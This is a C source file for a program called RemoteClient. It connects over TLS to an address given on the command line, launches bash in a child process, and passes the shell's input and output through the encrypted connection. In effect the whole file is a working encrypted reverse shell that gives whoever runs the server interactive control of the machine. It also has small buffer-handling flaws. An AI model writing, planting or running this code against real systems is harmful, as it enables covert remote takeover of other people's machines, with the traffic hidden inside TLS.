#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <poll.h>
#include <stdlib.h>
#include <openssl/ssl.h>
#include <openssl/crypto.h>
#include <openssl/err.h>

#define PORT 8080

int main(int argc, char *argv[]) {
    // Declare variables
    int size;
    int pipeIn[2];
    int pipeOut[2];
    int pid1;
    char *bash[] = {NULL};
    int ret;
    struct pollfd pfd[2];
    char bufferIn[1024] = { 0 };
    char bufferOut[1024] = { 0 };
   
    // Socket related variables
    int status, valread, client_fd;
    int iRet;
    struct sockaddr_in serv_addr;
   
    // Check command line arguments
    if (argc < 3){
        fprintf (stderr, "Invalid arguments\nusage: RemoteClient <ip addr> <identifier>\n");
        exit(1);
    }

    // Initialize SSL library
    SSL_library_init();
    SSL_load_error_strings();
   
    // Create SSL context
    SSL_CTX* ssl_ctx = SSL_CTX_new(SSLv23_client_method());
    if (!ssl_ctx) {
        printf("could not SSL_CTX_new\n");
        return 1;
    }
   
    // Create a socket
    client_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (client_fd < 0) {
        fprintf(stderr, "\n Socket creation error \n");
        return -1;
    }

    // Create SSL structure for SSL connection
    SSL* ssl = SSL_new(ssl_ctx);
    if (!ssl) {
        printf("could not SSL_new\n");
        return 1;
    }
   
    // Set server address
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    // Convert IPv4 address from text to binary form
    iRet = inet_pton(AF_INET, argv[1], &serv_addr.sin_addr);
    if (iRet <= 0) {
        fprintf(stderr, "\nInvalid address/ Address not supported \n");
        return -1;
    }

    // Connect to the server
    status = connect(client_fd, (struct sockaddr*)&serv_addr, sizeof(serv_addr));
    if (status < 0) {
        fprintf(stderr, "\nConnection Failed \n");
        return -1;
    }
   
    // Open pipes for input and output
    pipe(pipeIn);
    pipe(pipeOut);

    // Fork a new process
    pid1 = fork();

    if (pid1 == 0){
        // Child process
        // Redirect standard input and output to pipes
        dup2(pipeIn[0], 0);
        close(pipeIn[1]);
       
        dup2(pipeOut[1], 1);
        dup2(pipeOut[1], 2);
        close(pipeOut[0]);

        // Execute bash shell
        execvp("bash", bash);
    }else{
        // Parent process
        // Close unnecessary pipe ends
        close(pipeOut[1]);
        close(pipeIn[0]);
       
        // Set file descriptor for SSL connection
        if (!SSL_set_fd(ssl, client_fd)) {
            close(client_fd);
            printf("could not SSL_set_fd\n");
            return 1;
        }
       
        // Set SSL connection state to connect
        SSL_set_connect_state(ssl);
       
        // Initiate SSL handshake
        int action = SSL_connect(ssl);
        if(action < 0){
            fprintf(stderr, "\nSSL Connection Failed \n");
            return -1;
        }

        // Send identifier to the server
        sprintf (bufferIn, "remote:%s\n", argv[2]);
        SSL_write(ssl, bufferIn, strlen(bufferIn));

        // Set up pollfd structures for polling
        pfd[0].fd = client_fd;
        pfd[0].events = POLLIN;
       
        pfd[1].fd = pipeOut[0];
        pfd[1].events = POLLIN;
       
        // Infinite loop for polling and handling I/O
        while(1){
            // Poll for events
            ret = poll(pfd, 2, -1);
            if (ret < 0){
                perror("poll");
            }
            // Check for data to read from client socket
            if(pfd[0].revents & POLLIN){
                valread = SSL_read(ssl, bufferIn, sizeof(bufferIn));
                if (valread == 0){
                    break;
                }
                bufferIn[valread] = '\0';
                // Write data to input pipe for child process
                if (write(pipeIn[1], bufferIn, strlen(bufferIn)) == 0){
                    break;
                }
            }               
            // Check for data to read from child process output
            if(pfd[1].revents & POLLIN){
                size = read(pipeOut[0], bufferOut, sizeof(bufferOut) - 1);
                if (size > 0){
                    bufferOut[size] = '\0';
                    // Write data to SSL connection
                    SSL_write(ssl, bufferOut, size);
                }
            }            
        }
    }
    // Close the connected socket
    close(client_fd);
    // Free SSL structure
    SSL_free(ssl);
    return 0;
}

